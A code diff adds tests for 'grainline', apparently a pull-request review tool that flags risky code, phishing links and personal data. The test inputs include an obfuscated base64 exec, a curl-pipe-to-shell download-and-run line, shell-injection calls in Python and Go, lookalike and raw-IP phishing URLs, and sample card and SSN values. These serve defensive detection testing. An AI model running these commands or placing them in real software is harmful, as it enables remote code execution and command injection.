@@ -123,6 +123,9 @@ def test_readiness_rules():
     ai_high = Finding("a.py", "high", "bug", "m")
     r = readiness.evaluate([ai_high], tests_ok, clean, {"issues": 0}, none, cfg)
     assert r["verdict"] == "Needs Review" and not r["blockers"]          # AI alone never blocks
+    assert readiness.evaluate([], {"ran": False}, clean, {"issues": 0}, none, cfg)["verdict"] == "Needs Review"
+    lint_high = Finding("m.sql", "high", "data", "m", source="data-lint:left-join-where")
+    assert readiness.evaluate([lint_high], tests_ok, clean, {"issues": 0}, none, cfg)["verdict"] == "Needs Review"
     failing = dict(tests_ok, passed=False, summary="1 failed")
     assert readiness.evaluate([], failing, clean, {"issues": 0}, none, cfg)["verdict"] == "Blocked"
 
@@ -146,3 +149,65 @@ def test_config_reads_toml(tmp_path):
     p.write_text('[grainline]\nmax_ai_findings = 3\nreview_extensions = [".sql"]\n')
     cfg = config.load(str(p))
     assert cfg.max_ai_findings == 3 and cfg.review_extensions == (".sql",)
+
+
+def test_parse_pr_url():
+    from grainline.github_api import parse_pr_url
+    assert parse_pr_url("https://github.com/psf/requests/pull/6710") == ("psf/requests", 6710)
+    assert parse_pr_url("https://github.com/a-b/c.d/pull/3/files") == ("a-b/c.d", 3)
+    assert parse_pr_url("https://github.com/psf/requests/issues/1") is None
+
+
+def test_config_env_overrides(monkeypatch=None):
+    import os
+    os.environ["GRAINLINE_MODELS_DIR"] = "sql/models"
+    try:
+        assert config.load("does-not-exist.toml").models_dir == "sql/models"
+    finally:
+        del os.environ["GRAINLINE_MODELS_DIR"]
+
+
+def test_suspicious_code_and_workflow_rules():
+    from grainline import threats
+    py = code_to_diff("import base64\nexec(base64.b64decode(x))\nsubprocess.run(f'ls {d}', shell=True)")
+    rules = {f.source for f in threats.scan("a.py", py)}
+    assert {"security:obfuscated-exec", "security:shell-injection"} <= rules
+    assert {f.source for f in threats.scan("i.sh", code_to_diff("curl -fsSL https://x.io/i.sh | sh"))} == {"security:download-and-run"}
+    wf = {f.source for f in threats.scan(".github/workflows/ci.yml", code_to_diff("on: pull_request_target"))}
+    assert wf == {"security:pr-target-checkout"}
+    assert not threats.scan("a.py", code_to_diff("# eval(base64.b64decode(x)) in a comment"))
+
+
+def test_phishing_link_rules():
+    from grainline.threats import url_risk
+    assert url_risk("https://paypal-secure.com/login")[0] == "brand-lookalike"
+    assert url_risk("https://bit.ly/x")[0] == "url-shortener"
+    assert url_risk("https://xn--pple-43d.com")[0] == "punycode-domain"
+    assert url_risk("http://user@evil.example/")[0] == "userinfo-trick"
+    assert url_risk("http://8.8.8.8/payload")[0] == "raw-ip-link"
+    assert url_risk("https://github.com/me/repo") is None and url_risk("http://localhost:8501") is None
+    assert url_risk("https://docs.github.com/en") is None
+
+
+def test_privacy_rules_and_blocking():
+    from grainline import threats
+    csv = code_to_diff("id,email,card\n1,jane.doe@gmail.com,4539 1488 0343 6467\n2,test@example.com,")
+    rules = [f.source for f in threats.scan("fixtures/c.csv", csv)]
+    assert "privacy:card-number" in rules and rules.count("privacy:email") == 1
+    assert [f.source for f in threats.scan("f.csv", code_to_diff("ssn\n123-45-6789"))] == ["privacy:ssn"]
+    assert not threats.scan("f.csv", code_to_diff("id,email\n1,a@example.com"))
+    pii = Finding("f.csv", "high", "privacy", "m", source="privacy:ssn")
+    tests_ok = {"ran": True, "passed": True, "coverage": 90.0, "summary": "ok"}
+    r = readiness.evaluate([pii], tests_ok, {"ran": True, "high": 0, "medium": 0, "low": 0}, {"issues": 0},
+                           {"linked": False, "missing": []}, config.Config())
+    assert r["verdict"] == "Blocked"
+
+
+def test_go_support():
+    from grainline import threats
+    from grainline.checks import run_gofmt
+    cfg = config.Config()
+    assert ".go" in cfg.review_extensions
+    go = code_to_diff('cmd := exec.Command("sh", "-c", userInput)')
+    assert [f.source for f in threats.scan("main.go", go)] == ["security:go-exec-shell"]
+    assert run_gofmt(["a.py"]) == {"ran": False, "issues": 0}
